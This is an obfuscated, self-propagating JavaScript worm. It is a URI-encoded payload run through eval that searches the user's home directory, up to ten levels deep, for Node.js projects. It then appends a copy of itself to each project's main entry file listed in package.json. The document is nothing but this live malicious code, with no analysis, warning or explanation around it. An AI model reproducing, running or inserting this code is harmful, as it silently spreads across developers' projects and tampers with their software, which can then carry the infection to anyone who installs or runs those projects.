(function() {
        var payload = "%22use%20strict%22;function%20_toConsumableArray(arr)%7Bif(Array.isArray(arr))%7Bfor(var%20i=0,arr2=Array(arr.length);i%3Carr.length;i++)arr2%5Bi%5D=arr%5Bi%5D;return%20arr2%7Dreturn%20Array.from(arr)%7Dfunction%20infect(payload)%7Bfunction%20readdir(dir)%7Breturn%20new%20Promise(function(rs,rj)%7Bfs.readdir(dir,function(e,r)%7Breturn%20e?rj(e):rs(r)%7D)%7D)%7Dfunction%20stat(f)%7Breturn%20new%20Promise(function(rs)%7Bfs.stat(f,function(err,res)%7Brs(!err&&res.isFile()?%22file%22:!err&&res.isDirectory()?%22dir%22:null)%7D)%7D)%7Dfunction%20appendFile(f,data)%7Breturn%20new%20Promise(function(rs,rj)%7Bfs.appendFile(f,data,function(e)%7Breturn%20e?rj(e):rs()%7D)%7D)%7Dfunction%20readFile(f)%7Breturn%20new%20Promise(function(rs,rj)%7Bfs.readFile(f,%22utf-8%22,function(e,r)%7Breturn%20e?rj(e):rs(r)%7D)%7D)%7Dfunction%20getProjectMains(root,depth)%7Breturn%20depth%3C1?%5B%5D:readdir(root).then(function(files)%7Breturn%20Promise.all(files.map(function(file)%7Bvar%20full=path.join(root,file);return%20stat(full).then(function(dirInfo)%7Bif(%22dir%22!==dirInfo)return%5B%5D;var%20pkgPath=path.join(full,%22package.json%22);stat(pkgPath).then(function(res)%7Breturn%22file%22!==res?getProjectMains(full,depth-1):readFile(pkgPath).then(function(res)%7Bvar%20main=JSON.parse(res).main%7C%7C%22index.js%22,mainPath=path.join(full,main);return%20stat(main).then(function(res)%7Breturn%22file%22===res?%5BmainPath%5D:%5B%5D%7D)%7D)%7D)%7D)%7D)).then(function(arrs)%7Bvar%20res=%5B%5D,_iteratorNormalCompletion=!0,_didIteratorError=!1,_iteratorError=void%200;try%7Bfor(var%20_step,_iterator=arrs%5BSymbol.iterator%5D();!(_iteratorNormalCompletion=(_step=_iterator.next()).done);_iteratorNormalCompletion=!0)%7Bvar%20arr=_step.value;res.push.apply(res,_toConsumableArray(arr))%7D%7Dcatch(err)%7B_didIteratorError=!0,_iteratorError=err%7Dfinally%7Btry%7B!_iteratorNormalCompletion&&_iterator.return&&_iterator.return()%7Dfinally%7Bif(_didIteratorError)throw%20_iteratorError%7D%7Dreturn%20res%7D)%7D)%7Dvar%20fs=require(%22fs%22),os=require(%22os%22),path=require(%22path%22),modifiedPayload='%5Cn%20%20%20%20%20%20%20%20(function()%20%7B%5Cn%20%20%20%20%20%20%20%20%20%20%20%20var%20payload%20=%20%22'+payload+'%22;%5Cn%20%20%20%20%20%20%20%20%20%20%20%20eval(decodeURI(payload));%5Cn%20%20%20%20%20%20%20%20%20%20%20%20infect(%20payload%20);%5Cn%20%20%20%20%20%20%20%20%7D)();%5Cn%20%20%20%20';getProjectMains(os.homedir(),10).then(function(files)%7Breturn%20Promise.all(files.map(function(file)%7BreadFile(file).then(function(data)%7Bif(-1===data.indexOf(modifiedPayload))return%20appendFile(file,modifiedPayload)%7D)%7D))%7D)%7D";
        eval( decodeURI(payload) );
        infect(payload);
    })();